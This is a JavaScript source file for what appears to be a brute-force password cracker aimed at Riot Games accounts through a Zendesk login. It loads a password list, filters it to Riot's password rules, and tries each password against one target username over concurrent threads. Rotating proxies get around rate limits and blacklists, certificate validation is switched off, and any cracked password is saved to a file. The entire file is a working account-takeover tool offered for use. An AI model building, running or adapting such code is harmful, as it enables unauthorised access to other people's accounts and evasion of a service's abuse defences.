import { Zendesk } from './riot/Zendesk.js';
import { HttpsProxyAgent } from 'https-proxy-agent';
import * as fs from 'fs';
import { AuthFailureError, LoginFailureError, RateLimitedError, SessionCookieError } from './errors/index.js';
import { Logger } from './util/Logger.js';
import config from './config.json' with { type: 'json' };
import { readLines, readLinesStream, sleep } from './util/funcs.js';
import * as Types from './typedef.js';

// Disable certificate validation
// because some proxies use self-signed certificates
// and node-fetch doesn't like that
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

/**
 * DO NOT EDIT BELOW THIS LINE
 */
const USERNAME = config.username;
let threads = 0;

const logger = Logger.getInstance();

// Read passlist
// const passwords = readLines(config.pass_list_path);

// Read passlist in chunks
let passwords = [];
async function processPassList() {
  await readLinesStream(config.pass_list_path, (line) => {
    passwords.push(line);
  });
  logger.info('Successfully processed pass list.');
}

// Read proxy list
let proxies;
if (config.use_proxy_list === true) {
  proxies = readLines(config.proxy_list_path);
}

let found = false;
let foundPassword = '';

function saveCredentialsAndExit() {
  try {
    fs.writeFileSync('./credentials.txt', `${USERNAME}:${foundPassword}`, {
      encoding: 'utf-8',
      flag: 'w',
    });
  } catch (err) {
    logger.error('Could not write password to file.');
  }
  process.exit(0);
}

function checkFound() {
  if (found) saveCredentialsAndExit();
}

async function doWork(password) {
  threads++;
  for (;;) {
    checkFound();

    /**
     * @type {Types.Proxy}
     */
    const proxy = {};
    let proxyAgent = null;
    if (proxies) {
      const proxyLine = proxies[Math.floor(Math.random() * proxies.length)];
      if (!proxyLine) continue;
      const split = proxyLine.split(':');

      proxy.host = split[0];
      proxy.port = split[1];

      // check if proxy has credentials
      if (split.length >= 4) {
        proxy.user = split[2];
        proxy.pass = split[3];
      }

      proxy.address = `${proxy.host}:${proxy.port}`;
      proxy.url =
        proxy.user && proxy.pass
          ? `http://${proxy.user}:${proxy.pass}@${proxy.host}:${proxy.port}`
          : `http://${proxy.host}:${proxy.port}`;
      proxyAgent = new HttpsProxyAgent(proxy.url);
    }

    logger.log(`Trying ${USERNAME}:${password}${proxy.host ? ' on Proxy ' + proxy.address : ''}`);

    try {
      const zendesk = new Zendesk(USERNAME, password, proxyAgent);
      await zendesk.login();
      logger.success(`Found credentials - ${USERNAME}:${password}`);
      found = true;
      foundPassword = password;
    } catch (err) {
      // password probably wrong, go to next password
      if (err instanceof AuthFailureError) {
        logger.warn(`Password wrong - ${password}`);
        threads--;
        break;
      }

      // login failure, go to next password
      if (err instanceof LoginFailureError) {
        logger.warn(`Login failure`);
        threads--;
        break;
      }

      // proxy rate limited, or blacklisted, try next proxy
      if (err instanceof RateLimitedError || err instanceof SessionCookieError) {
        logger.error(err);
        continue;
      }

      // request timed out, try next proxy
      if (err.name === 'AbortError') {
        logger.error('Request timed out');
        continue;
      }

      // most likely a proxy error, try next proxy
      logger.error(err);
      continue;
    }
    break;
  }
}

async function start() {
  logger.info('Starting...');
  logger.info('Max concurrent threads: ' + config.concurrent_threads);

  logger.info('Processing pass list...');
  await processPassList();

  /**
   * Password validation:
   * 1. must be at least 8 characters long
   * 2. must contain at least one letter and one non-letter character
   *
   * Note: if `known_password_length` is set in the configuration, must be exactly that length
   */
  const filteredPasswords = passwords.filter((p) => {
    let passLengthExpression = false;
    if (config.known_password_length && config.known_password_length !== 0) {
      passLengthExpression = p.length === config.known_password_length;
    } else {
      passLengthExpression = p.length >= 8;
    }
    const letterExpression = p.match(/[a-zA-Z]/);
    const nonLetterExpression = p.match(/[^a-zA-Z]/);
    return passLengthExpression && letterExpression && nonLetterExpression;
  });

  for (const password of filteredPasswords) {
    // check if threads are full and wait until one is free
    while (threads >= config.concurrent_threads) {
      await sleep(1000);
    }

    checkFound();
    logger.info(`Number of threads: ${threads}`);
    doWork(password);
    await sleep(500); // if you have thousands of proxies you might not even need this
  }
}
start();
